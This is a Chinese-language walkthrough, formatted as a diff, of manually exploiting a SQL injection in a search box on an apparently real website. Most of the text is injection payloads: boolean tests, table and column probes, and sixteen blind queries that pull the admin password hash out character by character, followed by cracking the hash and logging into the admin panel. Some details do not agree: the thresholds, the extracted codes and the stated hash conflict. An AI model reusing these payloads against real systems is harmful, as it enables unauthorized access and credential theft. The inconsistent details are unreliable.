@@ -1,0 +1,33 @@
+利用搜索框注入拿webshell 首先判断注入点,在查询关键字那里输入：4%' and 1=1 and '%' ='    返回正常，没报错，
+
+然后输入：4%' and 1=2 and '%' ='  报错了，说明这个地方是存在注入点的。
+这个是post的方式的，抓包之后，本来打算用工具来跑的，试了一下，没检测出来，我就用手工来慢慢检测吧。
+我没有马上查表名，而是去看了看后台，直接在域名后面加上admin成功爆出后台，找到后台后看了一下这个后台的源文件。
+
+好了，我们先来查询一下表名吧，在搜索框里输入：%'and(select count(*)from admin)>0 and '%'='     返回正常，说明这个admin表存在。
+
+我再来查看一下字段吧，从刚才查看那个后台的源文件得知有psw这个字段，查询字段：
+4%'and(select top 1 len(psw)from admin) and '%'='  返回正常。
+
+现在重点来了，我们查一下它里面的内容吧
+4%'and(select top 1 asc(mid(psw,1,1))from admin)>54 and '%'='  
+4%'and(select top 1 asc(mid(psw,2,1))from admin)>49 and '%'='  
+4%'and(select top 1 asc(mid(psw,3,1))from admin)>54 and '%'='  
+4%'and(select top 1 asc(mid(psw,4,1))from admin)>96 and '%'='  
+4%'and(select top 1 asc(mid(psw,5,1))from admin)>100 and '%'=' 
+4%'and(select top 1 asc(mid(psw,6,1))from admin)>98 and '%'='  
+4%'and(select top 1 asc(mid(psw,7,1))from admin)>48 and '%'='  
+4%'and(select top 1 asc(mid(psw,8,1))from admin)>97 and '%'='  
+4%'and(select top 1 asc(mid(psw,9,1))from admin)>96 and '%'='  
+4%'and(select top 1 asc(mid(psw,10,1))from admin)>53 and '%'=' 
+4%'and(select top 1 asc(mid(psw,11,1))from admin)>99 and '%'=' 
+4%'and(select top 1 asc(mid(psw,12,1))from admin)>55 and '%'=' 
+4%'and(select top 1 asc(mid(psw,13,1))from admin)>100 and '%'=' 
+4%'and(select top 1 asc(mid(psw,14,1))from admin)>49 and '%'='  
+4%'and(select top 1 asc(mid(psw,15,1))from admin)>51 and '%'='   
+4%'and(select top 1 asc(mid(psw,16,1))from admin)>56 and '%'='   
+手工注入就是麻烦，通过我慢慢的检测，成功爆出了相应的值：
+55 50 55 97 101 99 49 98 97 54 96 56 101 50 52 57
+用转换工具转换了一下得出：727aec1ba6d8e249 （md5值）
+解密之后就是：101010
+我试了一下用户名admin果然正确，登录后台。
